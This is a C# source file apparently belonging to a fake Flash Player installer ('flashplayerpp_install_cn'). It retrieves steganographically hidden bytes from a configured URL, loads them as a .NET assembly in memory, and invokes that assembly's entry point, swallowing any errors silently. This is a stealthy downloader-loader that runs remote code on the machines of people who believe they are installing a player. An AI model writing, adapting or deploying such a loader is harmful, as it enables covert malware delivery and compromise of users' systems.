using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;

namespace flashplayerpp_install_cn
{
    class MyFunctionAction
    {
        public void Run()
        {
   
            var a = new Stego(Config.URL);
            var byteData = a.Run();
            MemoryStream ms = new MemoryStream(byteData);
            string[] str1 = new string[]{ "1", "2", "3"};
            object[] cmd = str1.ToArray();
            try
            {
                //Access web and read the bytes from the binary file
                BinaryReader br = new BinaryReader(ms);
                byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                ms.Close();
                br.Close();
                loadAssembly(bin, cmd);
            }
            catch
            {

            }
        }

        public  void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
    }
}
